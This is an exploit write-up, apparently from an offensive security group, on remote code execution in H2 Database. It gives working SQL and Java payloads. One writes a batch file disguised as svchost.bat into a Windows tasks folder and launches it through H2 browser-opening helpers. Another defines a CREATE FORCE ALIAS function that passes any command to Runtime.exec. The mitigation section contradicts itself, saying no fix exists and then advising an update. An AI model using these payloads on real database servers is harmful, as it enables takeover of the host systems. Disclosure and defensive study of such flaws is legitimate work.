# H2 Database Remote Code Execution (RCE) - Exploit Overview

**Date:** 17/07/2024  
**Author:** ViperX Offensive Security

## Affected Versions
H2 Database versions 1.0 to 2.3.230 are vulnerable to remote code execution (RCE).

## Exploit Flow
The exploitation strategy varies based on the version of the H2 Database:

1. **For Versions < 1.4:**
    - **Step 1:** Create a 'dummy' table within the database.
    - **Step 2:** Use the `SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}'` command to write output logs to a file located at `C:\Windows\Tasks\svchost.bat`.
    - **Step 3:** Depending on the specific version, execute the `.bat` file to achieve RCE:
        - For older versions, utilize `org.h2.util.StartBrowser.openURL`.
        - For newer versions, utilize `org.h2.tools.Server.openBrowser`.

2. **For Versions ≥ 1.4:**
    - **Step 1:** Exploit the 'CREATE ALIAS' function to execute Java code directly.

## Detailed Exploit Steps

1. **Creating a Dummy Table and Writing Logs:**
    ```sql
    CREATE TABLE dummy (id INT);
    SCRIPT SIMPLE NODATA NOSETTINGS TO 'C:\Windows\Tasks\svchost.bat';
    ```

2. **Executing the Batch File:**
    - **For Older Versions:**
        ```java
        org.h2.util.StartBrowser.openURL('file:///C:/Windows/Tasks/svchost.bat');
        ```
    - **For Newer Versions:**
        ```java
        org.h2.tools.Server.openBrowser('file:///C:/Windows/Tasks/svchost.bat');
        ```

** H2DB Versions >= 1.4 . **Java Code Execution via CREATE ALIAS:**
    `CREATE FORCE ALIAS CMD_INJECT AS $$
  void pwshInject() throws Exception {
      Runtime.getRuntime().exec("%s");
  }
  $$;`

By leveraging these methods, an attacker can perform remote code execution on vulnerable H2 Database instances, potentially gaining control over the host system.

## Mitigation
Since no fixes are currently available, it is recommended to implement the following measures to protect against this vulnerability:

- Update to the latest version of H2 Database.
- Implement strict access controls to limit exposure to untrusted networks.
- Regularly audit and monitor database configurations and activity.

For further details and assistance, please contact ViperX Offensive Security.
